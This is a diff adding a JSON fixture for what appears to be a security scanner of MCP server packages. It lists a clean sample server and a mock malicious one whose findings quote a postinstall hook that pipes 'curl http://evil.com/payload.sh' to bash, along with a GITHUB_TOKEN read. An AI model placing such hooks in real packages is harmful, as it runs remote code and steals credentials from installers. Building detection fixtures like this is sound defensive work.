@@ -1,0 +1,77 @@
+{
+  "version": "1.0.0",
+  "lastUpdated": "2026-04-02T00:00:00.000Z",
+  "totalEntries": 2,
+  "entries": [
+    {
+      "owner": "anthropics",
+      "name": "mcp-hello-world",
+      "url": "https://github.com/anthropics/mcp-hello-world",
+      "description": "A simple hello world MCP server for testing",
+      "stars": 42,
+      "topics": ["mcp-server"],
+      "lastAuditDate": "2026-04-02T00:00:00.000Z",
+      "riskScore": 0,
+      "findings": [],
+      "totalFindings": {
+        "critical": 0,
+        "high": 0,
+        "medium": 0,
+        "low": 0,
+        "info": 0
+      },
+      "verifiedSafe": true,
+      "scannedFiles": 5,
+      "packageName": "@anthropics/mcp-hello-world"
+    },
+    {
+      "owner": "shady-dev",
+      "name": "mcp-totally-safe",
+      "url": "https://github.com/shady-dev/mcp-totally-safe",
+      "description": "Definitely not malicious MCP server",
+      "stars": 3,
+      "topics": ["mcp-server"],
+      "lastAuditDate": "2026-04-02T00:00:00.000Z",
+      "riskScore": 100,
+      "findings": [
+        {
+          "ruleId": "CRIT-001",
+          "severity": "CRITICAL",
+          "file": "package.json",
+          "line": 8,
+          "match": "\"postinstall\": \"curl http://evil.com/payload.sh | bash\"",
+          "message": "Lifecycle script executes shell commands via curl piped to bash. This runs automatically on npm install.",
+          "score": 100
+        },
+        {
+          "ruleId": "HIGH-002",
+          "severity": "HIGH",
+          "file": "src/index.ts",
+          "line": 3,
+          "match": "import { exec } from 'child_process'",
+          "message": "Imports child_process module, enabling arbitrary command execution on the host system.",
+          "score": 50
+        },
+        {
+          "ruleId": "HIGH-005",
+          "severity": "HIGH",
+          "file": "src/index.ts",
+          "line": 15,
+          "match": "process.env.GITHUB_TOKEN",
+          "message": "Reads sensitive environment variable GITHUB_TOKEN. Combined with network access, this enables credential theft.",
+          "score": 50
+        }
+      ],
+      "totalFindings": {
+        "critical": 1,
+        "high": 2,
+        "medium": 0,
+        "low": 0,
+        "info": 0
+      },
+      "verifiedSafe": false,
+      "scannedFiles": 8,
+      "packageName": "mcp-totally-safe"
+    }
+  ]
+}
